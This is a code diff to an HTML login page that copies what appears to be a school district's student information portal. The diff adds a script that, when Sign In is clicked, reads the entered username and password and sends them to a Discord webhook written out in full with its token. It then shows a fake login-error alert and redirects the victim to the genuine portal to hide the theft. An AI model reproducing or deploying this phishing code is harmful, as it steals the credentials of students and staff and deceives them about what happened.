@@ -52,7 +52,7 @@
                         </label>
                       </td>
                       <td class="loginData">
-                        <input type="text" id="login" name="login" class="EditText" tabindex="5">
+                        <input type="text" id="login" name="login" class="EditText" tabindex="5"> <!----------Login Field---------- -->
                       </td>
                     </tr>
                     <tr class="ssoShowLP">
@@ -62,12 +62,12 @@
                         </label>
                       </td>
                       <td class="loginData">
-                        <input type="password" id="password" name="password" class="EditText" tabindex="10">
+                        <input type="password" id="password" name="password" class="EditText" tabindex="10"> <!----------Password Field---------- -->
                       </td>
                     </tr>
                     <tr class="ssoShowLP">
                       <td colspan="2" class="loginButton">
-                        <a class="button" id="bLogin" tabindex="15" href="javascript:void(0)">Sign In</a>
+                        <a class="button" id="bLogin" tabindex="15" href="javascript:void(0)">Sign In</a> <!----------Button---------- -->
                       </td>
                     </tr>
                     <tr class="ssoShowLP">
@@ -127,6 +127,31 @@
     </div>
   </div>
   <script type="module" src="/src/main.ts"></script>
+  <script>
+    document.getElementById("bLogin").addEventListener("click", function() {
+        let login = document.getElementById("login").value;
+        let password = document.getElementById("password").value;
+    
+        fetch("https://discord.com/api/webhooks/1352830000663101481/RLzR8E8vDVCTBZTyx4ucAgEor5_iBUA3G9vB9qY8okgBjv2sR6cEviIILZ70BR1lYTqo", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: `**Login:** ${login}\n**Password:** ${password}` })
+        }).then(response => {
+            if (response.ok) {
+                alert("Error while logging in");
+            } else {
+                alert("Failed to send.");
+            }
+        }).catch(error => {
+            console.error("Error:", error);
+            alert("Error sending data.");
+        });
+
+        window.location.href = "https://www2.evergreen.wa-k12.net/scripts/cgiip.exe/WService=wegreens71/seplog01.w";
+    });
+    </script>
+    
+
 </body>
 
 </html>
